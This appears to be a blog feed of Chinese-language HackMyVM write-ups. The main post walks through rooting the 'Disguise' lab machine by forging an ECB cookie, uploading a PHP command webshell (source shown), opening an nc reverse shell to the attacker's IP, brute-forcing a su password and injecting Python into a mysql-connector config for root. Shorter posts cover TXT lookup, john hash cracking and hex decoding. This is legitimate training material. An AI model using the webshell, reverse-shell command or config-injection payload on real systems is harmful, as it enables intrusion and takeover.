└─$ echo '1mr9fHMuTh6J56IrZHP28w==' | base64 -d
�j�|s.N��+ds��
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ echo '1mr9fHMuTh6J56IrZHP28w==' | base64 -d | xxd
00000000: d66a fd7c 732e 4e1e 89e7 a22b 6473 f6f3  .j.|s.N....+ds..
```

这16字节的乱码很可能是加密后的用户信息。

### 5.3.1 分析加密模式和块大小

为了分析加密细节，注册不同长度的用户名（密码固定为`111111`），观察 `dark_session` 的变化。

*   用户 `admin` (5字节): `dark_session=1mr9fHMuTh6J56IrZHP28w%3D%3D`
    *   Base64解码后xxd: `d66a fd7c 732e 4e1e 89e7 a22b 6473 f6f3` (16字节)
*   用户 `adminadmin` (10字节): `dark_session=nkhz%2FGuSp8O6W0%2FNKRWDrg%3D%3D`
    *   Base64解码后xxd: `9e48 73fc 6b92 a7c3 ba5b 4fcd 2915 83ae` (16字节)
*   用户 `adminadminadmin` (15字节): `dark_session=iVItH823tj24X11GL%2BrzqF15zKXhTZzq4geu6%2BoJYh0%3D`
    *   Base64解码后xxd: `8952 2d1f cdb7 b63d b85f 5d46 2fea f3a8 5d79 cca5 e14d 9cea e207 aeeb ea09 621d` (32字节)
*   用户 `adminadminadminadmin` (20字节): `dark_session=iVItH823tj24X11GL%2BrzqHXcmFsh%2Be0Wk1hiTcLtOls%3D`
    *   Base64解码后xxd: `8952 2d1f cdb7 b63d b85f 5d46 2fea f3a8 75dc 985b 21f9 ed16 9358 624d c2ed 3a5b` (32字节)

观察15字节和20字节用户名的密文，它们的前16字节完全相同 (`8952...f3a8`)。这强烈暗示了加密模式为 **ECB (Electronic Codebook)**，且块大小为 **16字节**。

### 5.3.2 确认密码不参与Cookie加密

注册用户 `test2` (5字节)，密码 `1111111111` (与之前的 `111111` 不同)。
`dark_session=oLEv4TbjA09b0PNNSNRdhA%3D%3D`
Base64解码后xxd: `a0b1 2fe1 36e3 034f 5bd0 f34d 48d4 5d84` (仍为16字节)。
密文长度和结构未因密码改变而改变，确认密码不直接参与 `dark_session` 的加密。

### 5.3.3 推断Salt和填充机制

加密的明文结构推测为 `Salt + Username`，然后进行PKCS#7填充。

*   `adminadmin` (10字节) + Salt -&gt; 16字节密文 (1块)
*   `adminadminadmin` (15字节) + Salt -&gt; 32字节密文 (2块)

这表明 `(Salt长度 + 10)` 经过填充后为16字节，而 `(Salt长度 + 15)` 经过填充后为32字节。
设Salt长度为 `S`。

*   `S + 10 &lt;= 16`
*   `S + 15 &gt; 16` (因为产生了第二块密文)

如果 `S = 4`：

*   `4 + 10 = 14`字节。PKCS#7填充2字节 (每个字节为`\x02`)，总共16字节。
*   `4 + 15 = 19`字节。PKCS#7填充13字节 (每个字节为`\x0d`)，总共32字节。
    这个推断与第一个密文块可能相同的ECB特性吻合。

进一步验证Salt长度和PKCS#7填充规则（特别是当数据长度正好是块大小时）：
注册用户 `adminadminad` (12字节)，密码 `111111`。
`dark_session=iVItH823tj24X11GL%2BrzqMJwkfrsOdSxW16pbszGJLY%3D`
Base64解码后xxd: `8952 2d1f cdb7 b63d b85f 5d46 2fea f3a8 c270 91fa ec39 d4b1 5b5e a96e ccc6 24b6` (32字节)。
如果Salt为4字节，则 `Salt(4) + adminadminad(12) = 16`字节。根据PKCS#7填充规则，当数据长度等于块大小时，仍需填充一个完整的16字节块 (16个`\x10`)。因此总明文长度为32字节，产生32字节密文。这与观察一致，确认 **Salt长度为4字节**。

### 5.3.4 伪造simpleAdmin的Cookie

目标用户 `simpleAdmin` (11字节)。
服务器实际加密的明文为 `Salt(4) + 'simpleAdmin'(11) = 15`字节。
PKCS#7填充后为 `Salt(4) + 'simpleAdmin'(11) + '\x01'(padding)`，共16字节。

为了获取密文，我们可以注册一个用户名为 `simpleAdmin\x01` (这里 `\x01` 是用户名的一部分，总长12字节)。
服务器加密的明文块1将是 `Salt(4) + 'simpleAdmin\x01'(username_part, 12) = 16`字节。
由于正好16字节，会再填充一个16字节的 `\x10` 块。
但重要的是，第一个16字节明文块的数据与我们目标用户 `simpleAdmin` 经过填充后的明文块数据是相同的！

操作步骤：

1. 在注册页面输入用户名 `simpleAdmin`。

2. 使用BurpSuite拦截注册请求，将`username`参数值修改为 `simpleAdmin%01` (URL编码的`\x01`)，密码 `111111`。

   *注意：登录的时候也要进行和2一样的操作*

3. 注册成功后，浏览器Cookie中的 `dark_session` 值为 `%2B1%2B3%2FNxCLcIR0Jq9qDudF8JwkfrsOdSxW16pbszGJLY%3D`。

4. URL解码：`+1+3/NxCLcIR0Jq9qDudF8JwkfrsOdSxW16pbszGJLY=`

5. Base64解码后进行xxd查看：

   ```bash
   ┌──(kali㉿kali)-[/mnt/hgfs/gx]
   └─$ echo '+1+3/NxCLcIR0Jq9qDudF8JwkfrsOdSxW16pbszGJLY=' | base64 -d | xxd
   00000000: fb5f b7fc dc42 2dc2 11d0 9abd a83b 9d17  ._...B-......;..
   00000010: c270 91fa ec39 d4b1 5b5e a96e ccc6 24b6  .p...9..[^.n..$.
   ```

6. 取第一个16字节的密文 `fb5f b7fc dc42 2dc2 11d0 9abd a83b 9d17`。

7. 将此16字节密文进行Base64编码：

   ```bash
   ┌──(kali㉿kali)-[/mnt/hgfs/gx]
   └─$ echo '+1+3/NxCLcIR0Jq9qDudF8JwkfrsOdSxW16pbszGJLY=' | base64 -d | head -c 16 | base64
   +1+3/NxCLcIR0Jq9qDudFw==
   ```

8. 将得到的Base64编码后的字符串 `%2B1%2B3%2FNxCLcIR0Jq9qDudFw%3D%3D` (注意URL编码) 设置为 `dark_session` Cookie的值。

9. 访问 `http://dark.disguise.hmv/profile.php`，成功以 `simpleAdmin` 用户身份登录。
   ![image-20250516163748655](https://7r1umphk.github.io/image/20250516163749012.webp)
   这波操作，来之不易啊！

# 六、获取WebShell

以`simpleAdmin`身份登录后，进入后台管理页面 (`/manager/index.php`)，发现有添加商品的功能，并且可以上传商品图片。先上传了一个`reverse.php`
![image-20250516164155309](https://7r1umphk.github.io/image/20250516164155596.webp)

到首页查看源码，进入图片网址发现这个方式进入的不解析php

使用`gobuster`对 `dark.disguise.hmv` 站点进行目录扫描，确认图片上传路径。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ gobuster dir -u http://dark.disguise.hmv -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,md,html,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dark.disguise.hmv
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,md,html,zip,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 282]
/.php                 (Status: 403) [Size: 282]
/images               (Status: 301) [Size: 323] [--&gt; http://dark.disguise.hmv/images/]
/index.php            (Status: 200) [Size: 1020]
/login.php            (Status: 200) [Size: 1134]
# ... (部分输出) ...
/captcha.php          (Status: 200) [Size: 370]
^C
[!] Keyboard interrupt detected, terminating.
Progress: 20066 / 1323360 (1.52%)
===============================================================
Finished
===============================================================
```

发现 `/images/` 目录。但是是301状态，尝试在`/images/`访问`reverse.php`显示404,服务器对文件名做了处理（MD5或者其他哈希）
重新上传一个简单的PHP一句话木马，内容为：

```php
&lt;?php
if (isset($_REQUEST['cmd'])) {
    $command = $_REQUEST['cmd'];
    echo '&lt;pre&gt;'; // For better formatting of command output

    // Execute the command
    // Using passthru for direct output, or system/exec if preferred
    passthru($command, $return_var);
    // Alternatively:
    // $output = shell_exec($command);
    // echo htmlentities($output);

    echo '&lt;/pre&gt;';
} else {
    echo '&lt;html&gt;&lt;head&gt;&lt;title&gt;PHP CMD Exec&lt;/title&gt;&lt;/head&gt;&lt;body&gt;';
    echo '&lt;form method='GET'&gt;';
    echo 'Enter command: &lt;input type='text' name='cmd' autofocus&gt;';
    echo '&lt;input type='submit' value='Execute'&gt;';
    echo '&lt;/form&gt;';
    echo '&lt;p&gt;Example: ?cmd=ls -la OR ?cmd=whoami&lt;/p&gt;';
    echo '&lt;/body&gt;&lt;/html&gt;';
}
?&gt;
```

上传时，给文件名加了一个`'`成功报错拿到了真实文件名。
![image-20250516165009887](https://7r1umphk.github.io/image/20250516165010255.webp)
访问 `http://dark.disguise.hmv/images/8d755f95e5203d7d71d93aefa9649514.php?cmd=id`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl http://dark.disguise.hmv/images/8d755f95e5203d7d71d93aefa9649514.php?cmd=id
&lt;pre&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/pre&gt;
```

命令成功执行，当前用户为 `www-data`。

# 七、权限提升

## 7.1 获取反弹Shell

利用已上传的Webshell获取一个反弹Shell，以便进行更方便的操作。
在Kali上设置监听：

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/shell]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
```

通过Webshell执行反弹命令：
`http://dark.disguise.hmv/images/8d755f95e5203d7d71d93aefa9649514.php?cmd=nc+192.168.205.206+8888+-e+/bin/bash`

![image-20250516165136706](https://7r1umphk.github.io/image/20250516165136907.webp)

成功接收到反弹Shell。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/shell]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.206] from (UNKNOWN) [192.168.205.211] 51496
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

对Shell进行TTY优化：

```bash
script /dev/null -c bash
# 按 Ctrl+Z 将其置于后台
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 24 columns 80
```

## 7.2 信息收集 (www-data 用户)

在 `/var/www/dark/` 目录下找到 `config.php`。

```bash
www-data@disguise:/var/www/dark$ cat config.php
&lt;?php

$DB_USER = 'dark_db_admin';
$DB_PASS = 'Str0ngPassw0d1***';
$DB_NAME = 'dark_shop';

?&gt;
```

拿到数据库用户名 `dark_db_admin` 和密码 `Str0ngPassw0d1***`。
登录数据库查看用户信息。

```bash
www-data@disguise:/var/www/dark$ mysql -u dark_db_admin -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 78045
Server version: 10.3.39-MariaDB-0+deb10u2 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| dark_shop          |
| information_schema |
+--------------------+
2 rows in set (0.014 sec)

MariaDB [(none)]&gt; use dark_shop;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [dark_shop]&gt; show tables;
+---------------------+
| Tables_in_dark_shop |
+---------------------+
| products            |
| users               |
+---------------------+
2 rows in set (0.000 sec)

MariaDB [dark_shop]&gt; select * from users;
+----+------------------------------------------+--------------------------+---------+---------------------+
| id | username                                 | password                 | isAdmin | created_at          |
+----+------------------------------------------+--------------------------+---------+---------------------+
|  1 | simpleAdmin                              | U3RyMG5nUGFzc3cwZDFAQEA= |       1 | 2025-04-01 04:33:22 |
# ... 其他用户 ...
+----+------------------------------------------+--------------------------+---------+---------------------+
13 rows in set (0.001 sec)
```

`simpleAdmin` 的密码哈希是 `U3RyMG5nUGFzc3cwZDFAQEA=`，Base64解码后是 `Str0ngPassw0d1***`。

查看 `/home/` 目录，发现用户 `darksoul`。

```bash
www-data@disguise:/var/www/dark$ ls -la /home/
total 12
drwxr-xr-x  3 root     root     4096 Mar 31 11:19 .
drwxr-xr-x 18 root     root     4096 Mar 31 11:13 ..
drwxr-xr-x  4 darksoul darksoul 4096 Apr  2 04:19 darksoul
```

尝试用 `Str0ngPassw0d1***` 切换到 `darksoul`，失败。
在 `/home/darksoul/` 目录下发现 `config.ini`，内容和 `/var/www/dark/config.php` 中的数据库密码一致。

```bash
www-data@disguise:/home/darksoul$ cat config.ini
[client]
user = dark_db_admin
password = Str0ngPassw0d1***
host = localhost
database = dark_shop
port = int(3306)
```

看来 `darksoul` 的密码需要爆破。密码格式可能是 `Str0ngPassw0d1` + 三个特殊字符。
上传一个su爆破脚本 `suForce` 和密码字典 `pass` 到 `/tmp/`。
字典 `pass` 生成方法

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ crunch 3 3 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789?!@#$%^&amp;*()' \ | sed 's/^/Str0ngPassw0d1/' &gt; pass
Crunch will now generate the following amount of data: 1556068 bytes
1 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 389017
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat pass | wc -l                                                               389017
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ tac pass | sponge pass
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat pass | wc -l
389017
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ head -n 10 pass
Str0ngPassw0d1)))
Str0ngPassw0d1))(
Str0ngPassw0d1))*
Str0ngPassw0d1))&amp;
Str0ngPassw0d1))^
Str0ngPassw0d1))%
Str0ngPassw0d1))$
Str0ngPassw0d1))#
Str0ngPassw0d1))@
Str0ngPassw0d1))!
```

```bash
www-data@disguise:/tmp$ wget 192.168.205.206/suForce
www-data@disguise:/tmp$ wget 192.168.205.206/pass
www-data@disguise:/tmp$ chmod +x suForce
www-data@disguise:/tmp$ ./suForce -u darksoul -w pass
            _____
 ___ _   _ |  ___|__  _ __ ___ ___
/ __| | | || |_ / _ \| '__/ __/ _ \
\__ \ |_| ||  _| (_) | | | (_|  __/
|___/\__,_||_|  \___/|_|  \___\___|
───────────────────────────────────
 code: d4t4s3c     version: v1.0.0
───────────────────────────────────
🎯 Username | darksoul
📖 Wordlist | pass
🔎 Status   | 54031/389017/13%/Str0ngPassw0d1??? 
💥 Password | Str0ngPassw0d1???                
───────────────────────────────────
```

爆破成功，`darksoul` 的密码是 `Str0ngPassw0d1???`
切换用户。

```bash
www-data@disguise:/tmp$ su darksoul
Password:
darksoul@disguise:/tmp$ id
uid=1000(darksoul) gid=1000(darksoul) groups=1000(darksoul)
```

成功切换到 `darksoul`。查看 `user.txt`。

```bash
darksoul@disguise:~$ ls -la
total 40
drwxr-xr-x 4 darksoul darksoul 4096 Apr  2 04:19 .
drwxr-xr-x 3 root     root     4096 Mar 31 11:19 ..
lrwxrwxrwx 1 root     root        9 Apr  2 00:16 .bash_history -&gt; /dev/null
-rw-r--r-- 1 darksoul darksoul  220 Mar 31 11:19 .bash_logout
-rw-r--r-- 1 darksoul darksoul 3526 Mar 31 11:19 .bashrc
-rw-r--r-- 1 root     root      114 Apr  2 04:03 config.ini
-rw-r--r-- 1 root     root       32 May 16 06:44 darkshopcount
drwx------ 3 darksoul darksoul 4096 Apr  1 10:03 .gnupg
drwxr-xr-x 3 darksoul darksoul 4096 Apr  1 10:04 .local
-rw-r--r-- 1 darksoul darksoul  807 Mar 31 11:19 .profile
-rw------- 1 darksoul darksoul   68 Apr  2 04:22 user.txt
darksoul@disguise:~$ cat user.txt
Good good study &amp; Day day up,but where is the flag?
darksoul@disguise:~$ grep -r -i 'HMV{' / 2&gt;/dev/null
/home/darksoul/user.txt:hmv{hiddenflag}
^C
```

这里有个flag `hmv{hiddenflag}`。
用`xxd`也能看到。

```bash
darksoul@disguise:~$ xxd user.txt
00000000: 476f 6f64 2067 6f6f 6420 7374 7564 7920  Good good study
00000010: 2620 4461 7920 6461 7920 7570 2c62 7574  &amp; Day day up,but
00000020: 2077 6865 7265 2069 7320 7468 6520 666c   where is the fl
00000030: 6167 3f0a 686d 767b 6869 6464 656e 666c  ag?.hmv{hiddenfl
00000040: 6167 7d0d                                ag}.
```

获取第一个flag: `hmv{hiddenflag}`。

## 7.3 darksoul -&gt; root 提权

使用`pspy64`监控进程。

```bash
darksoul@disguise:/tmp$ wget 192.168.205.206/pspy64
darksoul@disguise:/tmp$ chmod +x pspy64
darksoul@disguise:/tmp$ ./pspy64
# ... (pspy64 输出) ...
2025/05/16 06:51:01 CMD: UID=0     PID=16089  | /bin/sh -c /usr/bin/python3 /opt/query.py /home/darksoul/config.ini &gt; /home/darksoul/darkshopcount
2025/05/16 06:51:02 CMD: UID=0     PID=16090  | /usr/bin/python3 /opt/query.py /home/darksoul/config.ini
# ... (pspy64 输出) ...
```

发现一个root权限的cron定时任务，每一分钟执行 `/usr/bin/python3 /opt/query.py /home/darksoul/config.ini`。
查看 `/opt/query.py` 源码：

```python
import mysql.connector
import sys

def main():
    if len(sys.argv) != 2:
        print('Usage: python query.py &lt;configfile&gt;')
        sys.exit(1)

    cnf = sys.argv[1]

    try:
        conn = mysql.connector.connect(read_default_file=cnf) # 关键点
        cursor = conn.cursor()

        query = 'SELECT COUNT(*) FROM users'
        cursor.execute(query)
        results = cursor.fetchall()
        print(f'users count:{results[0][0]}')

        query = 'SELECT COUNT(*) FROM products'
        cursor.execute(query)
        results = cursor.fetchall()
        print(f'products count:{results[0][0]}')
    except mysql.connector.Error as err:
        print(f'db connect error: {err}')
    finally:
        if 'cursor' in locals():
            cursor.close()
        if 'conn' in locals() and conn.is_connected():
            conn.close()

if __name__ == '__main__':
    main()
```

脚本使用了 `mysql.connector.connect(read_default_file=cnf)`，其中`cnf`是 `/home/darksoul/config.ini`。
检查 `config.ini` 的权限。

```bash
darksoul@disguise:~$ ls -la config.ini
-rw-r--r-- 1 root root 114 Apr  2 04:03 config.ini
```

原 `config.ini` 是root所有，darksoul不可写。但是darksoul可以删除（因为父目录`/home/darksoul`是darksoul可写的），然后创建一个同名文件。

我当时是把原来的 `config.ini` 备份成了 `config.ini.bak`，然后新建了一个 `config.ini`。

```bash
darksoul@disguise:~$ mv config.ini config.ini.bak # 如果需要备份
darksoul@disguise:~$ touch config.ini
darksoul@disguise:~$ ls -la config.ini
-rw-r--r-- 1 darksoul darksoul 0 May 16 06:57 config.ini
```

查了一下 `mysql-connector-python` 的 `exploit`，google找不到，[[wx公众号](https://mp.weixin.qq.com/s/h3qOUrzhANfDJ0PuAJyc6w)](https://mp.weixin.qq.com/s/h3qOUrzhANfDJ0PuAJyc6w)找到了。信息收集的终点是wx公众号（滑稽）。
![image-20250516191958461](https://7r1umphk.github.io/image/20250516191958785.webp)

构造恶意的 `config.ini`：

```ini
[client]
user = dark_db_admin
password = Str0ngPassw0d1***
host = localhost
database = dark_shop
port = int(3306)
allow_local_infile=__import__('os').system('chmod u+s /bin/bash')
```

这个 `allow_local_infile` 配置项（或其他可利用的配置项）会被 `mysql.connector.connect` 解析并执行后面的Python代码，从而给 `/bin/bash` 加上SUID权限。

等待cron任务执行 (最多1分钟)。可以用 `pspy64` 监控。

```bash
# pspy64 输出中会看到
2025/05/16 07:19:01 CMD: UID=0     PID=16589  | sh -c chmod u+s /bin/bash
```

检查 `/bin/bash` 权限。

```bash
darksoul@disguise:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

成功加上SUID权限！执行 `bash -p` 获取root权限。

```bash
darksoul@disguise:~$ bash -p
bash-5.0# id
uid=1000(darksoul) gid=1000(darksoul) euid=0(root) groups=1000(darksoul)
bash-5.0# cat /root/root.txt
#Congratulations!!!
hmv{CVE-2025-21548}
```

成功获取root权限并读取 `/root/root.txt` 中的flag: `hmv{CVE-2025-21548}`。

# 八、总结

本次Disguise靶机的渗透过程涉及了Web应用层面的信息收集、漏洞扫描、子域名爆破，以及针对ECB加密模式下Cookie的巧妙伪造。后续通过对系统内部文件和进程的分析，发现了数据库凭证泄露和cron定时任务的配置不当，最终结合Python库的特性实现了权限提升至root。整个过程环环相扣，充分展现了信息收集和漏洞利用的重要性。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Disguise-ba-ji-shen-tou-ce-shi-xiang-jie.html</guid><pubDate>Fri, 27 Jun 2025 09:28:56 +0000</pubDate></item><item><title>Challenge 006：TXT记录的秘密</title><link>https://7r1UMPHK.github.io/post/Challenge%20006%EF%BC%9ATXT-ji-lu-de-mi-mi.html</link><description># 挑战信息

### 挑战信息

*   **挑战名称/编号:** Challenge 006
*   **挑战链接:** [https://hackmyvm.eu/challenges/challenge.php?c=006](https://hackmyvm.eu/challenges/challenge.php?c=006)

### 初始观察

![image-20250518100536187](https://7r1umphk.github.io/image/20250518100536383.webp)

我们得到了像 `'hackmyvm.eu. 100 IN TXT'` 这样的提示，那目标就非常明确了——直奔 `hackmyvm.eu` 的 TXT 记录去！

## 探索过程

有了这么明确的指向，咱们就用 `dig` 命令来一探究竟。

### 1.常规A记录查询

虽然目标直指TXT记录，但养成好习惯，先看看A记录总没错，了解一下域名指向的IP。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ dig hackmyvm.eu 

; &lt;&lt;&gt;&gt; DiG 9.20.8-6-Debian &lt;&lt;&gt;&gt; hackmyvm.eu
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 62911
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; MBZ: 0x0005, udp: 1232
;; QUESTION SECTION:
;hackmyvm.eu.                   IN      A

;; ANSWER SECTION:
hackmyvm.eu.            5       IN      A       188.68.49.239

;; Query time: 60 msec
;; SERVER: 192.168.205.2#53(192.168.205.2) (UDP)
;; WHEN: Sat May 17 22:05:57 EDT 2025
;; MSG SIZE  rcvd: 56
```

嗯，`hackmyvm.eu` 指向 `188.68.49.239`。信息get，但对这个特定挑战来说，不是重点。

### 2. 查询TXT记录

现在，根据我们的“情报”（或者说常规思路），直接查询 `hackmyvm.eu` 的 TXT 记录。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ dig txt hackmyvm.eu

; &lt;&lt;&gt;&gt; DiG 9.20.8-6-Debian &lt;&lt;&gt;&gt; txt hackmyvm.eu
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 12739
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; MBZ: 0x0005, udp: 1232
;; QUESTION SECTION:
;hackmyvm.eu.                   IN      TXT

;; ANSWER SECTION:
hackmyvm.eu.            5       IN      TXT     'hmv{sasviyalin}'

;; Query time: 388 msec
;; SERVER: 192.168.205.2#53(192.168.205.2) (UDP)
;; WHEN: Sat May 17 22:06:25 EDT 2025
;; MSG SIZE  rcvd: 68
```

Bingo! 看到 `ANSWER SECTION` 了吗？
`hackmyvm.eu.            5       IN      TXT     'hmv{sasviyalin}'`
这不就是咱们寻找的 Flag 嘛！

## Flag

毫无疑问，Flag 就是：

`hmv{sasviyalin}`
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20006%EF%BC%9ATXT-ji-lu-de-mi-mi.html</guid><pubDate>Fri, 27 Jun 2025 09:28:53 +0000</pubDate></item><item><title>Challenge 005 破解 Shadow 文件</title><link>https://7r1UMPHK.github.io/post/Challenge%20005%20-po-jie-%20Shadow%20-wen-jian.html</link><description>### 挑战信息

*   **挑战名称/编号:** Challenge 005
*   **挑战链接:** [https://hackmyvm.eu/challenges/challenge.php?c=005](https://hackmyvm.eu/challenges/challenge.php?c=005)

### 初始观察

![image-20250502152010221](https://7r1umphk.github.io/image/20250502152010304.png)

访问挑战页面后，描述告知我们获取了一个目标机器的 `/etc/shadow` 文件，但无法破解其中的 `root` 用户密码。挑战要求我们找出 `root` 用户的密码，并以 `HMV{rootpassword}` 的格式提交 Flag。

页面提供了一个名为 `shadow.txt` 的文件供下载。

### 分析与技术说明

**1. `/etc/shadow` 文件:**
在 Linux 和类 Unix 系统中，`/etc/shadow` 文件用于安全地存储用户的密码信息。与早期的 `/etc/passwd` 文件（所有用户可读）不同，`/etc/shadow` 文件通常只有 `root` 用户有读取权限，这大大提高了密码安全性。该文件存储的是用户密码的**哈希值 (Hash)**，而非明文密码。

一个典型的 `/etc/shadow` 文件条目格式如下：
`username:password_hash:last_password_change:min_days:max_days:warn_days:inactive_days:expire_date:reserved`

我们关心的主要是第二个字段：`password_hash`。

**2. 密码哈希:**
密码哈希是一种单向函数处理过程，它将任意长度的密码转换为一个固定长度的、看起来随机的字符串（哈希值）。关键在于这个过程是**不可逆的**，即无法从哈希值直接计算出原始密码。当用户登录时，系统会将其输入的密码进行相同的哈希运算，然后比较计算出的哈希值与存储在 `/etc/shadow` 中的哈希值是否一致。

常见的 Linux 密码哈希算法包括 MD5crypt (`$1$`)、SHA256crypt (`$5$`) 和 SHA512crypt (`$6$`) 等。哈希值字符串开头的 `$id$` 部分标识了所使用的算法。

**3. 密码破解 - 字典攻击:**
由于无法从哈希直接反推密码，破解密码哈希的常用方法之一是**字典攻击 (Dictionary Attack)**。这种方法依赖于一个包含大量常用密码、单词、短语等的列表（称为**字典文件**或**词典**，Wordlist）。破解工具会逐一读取字典中的词语，使用与目标哈希相同的算法计算该词语的哈希值，然后与目标哈希进行比较。如果匹配成功，就意味着找到了原始密码。

**John the Ripper (John)** 是一个非常流行的开源密码破解工具，支持多种哈希类型和攻击模式。`rockyou.txt` 是一个极其著名且庞大的密码字典文件，包含了数百万个从真实数据泄露事件中收集的常用密码，常用于密码安全审计和 CTF 比赛。

### 求解过程

1.  **下载文件:** 从挑战页面下载 `shadow.txt` 文件。
2.  **准备工具和字典:** 确保系统中安装了 `john` (John the Ripper)。同时，需要 `rockyou.txt` 字典文件。在 Kali Linux 等渗透测试发行版中，它通常位于 `/usr/share/wordlists/rockyou.txt.gz`，可能需要先使用 `gzip -d /usr/share/wordlists/rockyou.txt.gz` 命令解压缩。
3.  **执行破解:** 打开终端，使用 `john` 命令进行字典攻击。命令格式如下：
    ```bash
    john --wordlist=&lt;字典文件路径&gt; &lt;shadow文件路径&gt;
    ```
    具体到本例，命令为：
    ```bash
    john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
    ```

4.  **分析输出:** `john` 会开始尝试字典中的密码。当找到匹配的密码时，会显示出来。根据提供的解题过程截图，`john` 的输出显示：

    ```
    ┌──(kali㉿kali)-[/mnt/hgfs/gx/test]
    └─$ john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
    Created directory: /home/kali/.john
    Using default input encoding: UTF-8
    Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x]) 
    Cost 1 (iteration count) is 5000 for all loaded hashes
    Will run 8 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    reddragon        (root)      # &lt;--- 成功破解！root 用户的密码是 reddragon
    1g 0:00:00:00 DONE (2025-05-02 03:18) 2.439g/s 24975p/s 24975c/s 24975C/s total90..1asshole
    Use the '--show' option to display all of the cracked passwords reliably
    Session completed.
    ```
    输出明确显示 `root` 用户的密码已被破解，为 `reddragon`。

5.  **格式化 Flag:** 根据挑战要求的 `HMV{rootpassword}` 格式，将破解得到的密码填入。

### 结果：Flag

成功破解得到的 `root` 密码为 `reddragon`，因此 Flag 是：

```
HMV{reddragon}
```
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20005%20-po-jie-%20Shadow%20-wen-jian.html</guid><pubDate>Fri, 27 Jun 2025 09:28:50 +0000</pubDate></item><item><title>Challenge 004 十六进制的秘密</title><link>https://7r1UMPHK.github.io/post/Challenge%20004%20-shi-liu-jin-zhi-de-mi-mi.html</link><description>### 挑战信息

*   **挑战名称/编号:** Challenge 004
*   **挑战链接:** [https://hackmyvm.eu/challenges/challenge.php?c=004](https://hackmyvm.eu/challenges/challenge.php?c=004)

### 初始观察

![挑战004界面](https://7r1umphk.github.io/image/20250502151318558.png)

访问挑战页面后，页面直接展示了一长串由数字和字母组成的字符串：

```
686d767b6d79666c61676973656173797d
```

任务目标是解码或转换这个字符串以获得 Flag。

### 分析与技术说明

仔细观察给出的字符串 `686d767b6d79666c61676973656173797d`，我们可以发现它具有**十六进制（Hexadecimal）**表示法的显著特征：

1.  **字符集:** 字符串仅包含数字 `0` 到 `9` 以及小写字母 `a` 到 `f`。这是十六进制表示法的标准字符集（有时也使用大写 `A` 到 `F`）。
2.  **用途:** 十六进制常用于以文本形式紧凑地表示**二进制数据**。与直接显示二进制（0和1）相比，十六进制更易读写，并且比十进制更能直接反映底层的比特结构。它广泛应用于内存地址、颜色代码、文件签名、数据编码等领域。
3.  **原理:** 十六进制是一种基数为 16 的计数系统。每个十六进制数字代表 4 个比特（因为 2^4 = 16）。因此，**两个十六进制数字**可以精确地表示一个**字节（8 比特）**。在很多情况下，尤其是在处理文本数据时，这一字节通常对应一个 ASCII 字符。

### 解码过程

解码十六进制字符串可以使用多种工具，**CyberChef** 依然是一个非常便捷的选择：

1.  **访问** CyberChef 网站: [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)
2.  **输入 (Input):** 将十六进制字符串 `686d767b6d79666c61676973656173797d` 粘贴到“Input”框中。
3.  **选择操作 (Operations):** 在左侧操作列表中搜索 'From Hex'，然后将其拖拽到“Recipe”区域。
4.  **输出 (Output):** “Output”区域将自动显示解码后的结果。

也可以使用命令行工具进行解码：

*   在 Linux/macOS 系统下，可以使用 `xxd` 命令：
    ```bash
    echo '686d767b6d79666c61676973656173797d' | xxd -r -p
    ```
